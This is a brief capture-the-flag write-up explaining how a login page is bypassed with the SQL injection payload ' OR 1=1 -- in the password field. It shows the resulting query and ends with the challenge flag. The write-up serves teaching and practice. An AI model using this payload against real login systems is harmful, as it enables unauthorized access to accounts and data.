# 🔑 Write-Up

As we can see from the webpage's tab, we can try with an SQL injection. 

We can put anything as `username`, and for the `password`:
```plaintext
' OR 1=1 --
```
So, if the query were something like this
```sql
SELECT id, username FROM users WHERE username='user' AND password='password'
```
the resulting query would be 
``` sql
SELECT id, username FROM users WHERE username='user' AND password='' OR 1=1 --
```
The `--` comments out everything that follows on the same line, making the query effective. Since 1=1 is always true, the condition `OR 1=1` will always return `TRUE`, and thus the query will return the user with the username `user` regardless of the password.
### 🚩 Flag

```plaintext
spritz{Bl4nc0_m4dness}
```